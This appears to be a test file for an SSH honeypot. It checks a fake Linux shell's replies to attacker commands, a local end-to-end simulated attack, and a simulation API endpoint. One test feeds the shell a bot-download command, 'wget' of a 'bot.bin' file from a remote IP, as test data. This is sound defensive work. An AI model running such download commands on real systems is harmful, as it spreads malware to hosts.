import time
import socket
import threading

from honeypot.ssh_server import FakeLinuxShell, RealSSHHoneypotServer
from honeypot.simulator.real_attack_demo import run_real_ssh_attack
from backend.app import create_app


def test_fake_linux_shell_sandboxed_commands():
    shell = FakeLinuxShell(username="root", src_ip="127.0.0.1", src_port=54321, session_id="test_sess_1")

    out, exit_flag = shell.execute("whoami")
    assert out == "root"
    assert exit_flag is False

    out_id, _ = shell.execute("id")
    assert "uid=0(root)" in out_id

    out_uname, _ = shell.execute("uname -a")
    assert "Ubuntu" in out_uname

    out_pwd, _ = shell.execute("pwd")
    assert out_pwd == "/root"

    out_cd, _ = shell.execute("cd /tmp")
    assert out_cd == ""
    out_pwd2, _ = shell.execute("pwd")
    assert out_pwd2 == "/tmp"

    out_wget, _ = shell.execute("wget http://185.220.101.5/bot.bin")
    assert "200 OK" in out_wget

    out_exit, exit_flag2 = shell.execute("exit")
    assert out_exit == "logout"
    assert exit_flag2 is True


def test_real_ssh_honeypot_end_to_end():
    # Find an ephemeral free TCP port for testing
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        free_port = s.getsockname()[1]

    srv = RealSSHHoneypotServer(host="127.0.0.1", port=free_port)
    t = threading.Thread(target=srv.start, daemon=True)
    t.start()
    time.sleep(0.5)

    try:
        ok = run_real_ssh_attack(target_host="127.0.0.1", target_port=free_port, delay=0.05)
        assert ok is True
    finally:
        srv.stop()
        t.join(timeout=2.0)
        time.sleep(0.3)


def test_api_simulate_endpoint(monkeypatch):
    class DummyThread:
        def __init__(self, target=None, daemon=True):
            self.target = target
        def start(self):
            pass

    monkeypatch.setattr("backend.routes.dashboard_routes.threading.Thread", DummyThread)
    app = create_app()
    app.config["TESTING"] = True
    with app.test_client() as client:
        res = client.post("/api/simulate", json={"mode": "botnet"})
        assert res.status_code == 202
        data = res.get_json()
        assert data["status"] == "started"

